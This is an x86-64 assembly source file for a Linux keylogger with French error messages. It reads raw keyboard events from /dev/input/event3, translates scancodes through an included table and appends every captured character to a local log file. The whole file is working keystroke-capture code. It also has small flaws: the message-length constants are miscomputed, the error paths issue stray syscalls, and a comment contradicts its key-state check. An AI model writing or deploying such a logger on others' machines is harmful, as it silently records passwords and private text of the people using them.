BITS 64

section .data
        path_event  db "/dev/input/event3", 0
        path_log    db "logs/log", 0
        
        msg_openerr db "Erreur ouverture /dev/input/event3", 10, 0
        msg_openerr2 db "Erreur ouverture logs/log", 10, 0
        msg_readerr db "Erreur lecture /dev/input/event3", 10, 0

        msg_openerr_len equ $-msg_openerr
        msg_openerr2_len equ $-msg_openerr2
        msg_readerr_len equ $-msg_readerr


section .bss
        eventbuf    resb 24      ; struct input_event (24 bytes)
        log_fd: resq 1


section .rodata
%include "src/scancodes.inc"
%include "src/io.asm"


section .text
    global _start

_start:
        mov     rax, 2                  ; syscall open
        mov     rdi, path_event
        mov     rsi, 0                  ; O_RDONLY
        syscall

        cmp     rax, 0
        jl      .fail_open

        mov     r12, rax

        mov     rax, 2                  ; syscall open
        mov     rdi, path_log
        mov     rsi, 0x441              ; (O_WRONLY = 1, O_CREAT = 0x40, O_APPEND = 0x400)
        mov     rdx, 0o644
        syscall

        cmp     rax, 0
        jl      .fail_open2

        mov [log_fd], rax
        jmp     .read_loop



.fail_open:
        mov     rsi, msg_openerr
        mov     rdx, msg_openerr_len
        call    write
        syscall

        mov     rax, 60                 ; syscall exit
        xor     rdi, rdi
        syscall


.read_loop:
        mov     rax, 0                  ; syscall read
        mov     rdi, r12        
        mov     rsi, eventbuf
        mov     rdx, 24
        syscall

        cmp     rax, 24
        jne     .fail_read

        movzx   eax, word [eventbuf + 16]       ; type
        movzx   ebx, word [eventbuf + 18]       ; code
        mov     ecx, dword [eventbuf + 20]      ; value

        cmp     eax, 1                  ; 1 = EV_KEY (event clavier)
        jne     .read_loop

        cmp     ecx, 0                  ; 1 = appui (keydown)
        jne     .read_loop
    
        mov     al, [scancode_table + ebx]
        
        cmp     al, 0                   ; Si al = 0 not value
        je     .read_loop
 
        mov     byte [eventbuf], al      
        mov     rax, 1                  ; syscall write
        mov     rdi, [log_fd]
        lea     rsi, [eventbuf]
        mov     rdx, 1
        syscall
           
        jmp .read_loop


.fail_read:
        mov     rsi, msg_readerr
        mov     rdx, msg_readerr_len
        call    write
        syscall

        mov     rax, 60                 ; syscall exit
        xor     rdi, rdi
        syscall


.fail_open2:
        mov     rsi, msg_openerr2
        mov     rdx, msg_openerr2_len
        call    write
        syscall

        mov     rax, 60                 ; syscall exit
        xor     rdi, rdi
        syscall